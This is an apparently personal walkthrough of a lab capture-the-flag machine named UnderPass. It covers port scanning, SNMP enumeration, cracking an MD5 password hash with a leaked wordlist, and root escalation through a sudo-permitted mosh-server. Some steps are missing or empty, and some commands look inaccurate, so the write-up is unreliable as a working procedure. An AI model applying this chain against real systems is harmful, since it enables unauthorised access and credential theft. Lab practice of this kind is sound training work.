# UnderPass





## Nmap

```
sudo nmap -sS --min-rate 5000 -Pn -n -vvv -p- 10.10.11.48 -oG allPorts
```


```
sudo nmap -sS -sU -v 10.10.11.48
```

We've got the `161` UDP open port !
```
PORT     STATE         SERVICE
22/tcp   open          ssh
80/tcp   open          http
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct
```

Using `snmpwalk`, we can extract information
```
snmpwalk -v 2c -c 10.10.11.48
```

The output shows there's a service `daloradius` and a `email`
```
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
SNMPv2-MIB::sysServices.0 = INTEGER: 72
```

We use `john` in order to crack the passowrd
```
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format=raw-md5 svcMosh_password_encrypted.txt
```
> I stored the hashed pass in the txt file

We got the clear password
```
[qwerty:35473] create_and_attach: unable to create shared memory BTL coordinating structure :: size 134217728
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)
1g 0:00:00:00 DONE (2025-02-14 18:03) 5.263g/s 15704Kp/s 15704Kc/s 15704KC/s undiamassinverte..underthebus
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

> The clear passwd is `underwaterfriends`

Let's connect to the `ssh`



See the user flag
```

```


```
sudo -l
```

We've got the `mosh` service 
```
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

looking for the available options, we see this one
```
        --server=COMMAND     mosh server on remote machine
                                (default: "mosh-server")
```

We can use this server command in order to get access !
```
mosh --server="sudo /usr/bin/mosh" 127.0.0.1
```

We got root !
```
root@underpass:~#
```

Check for the flag

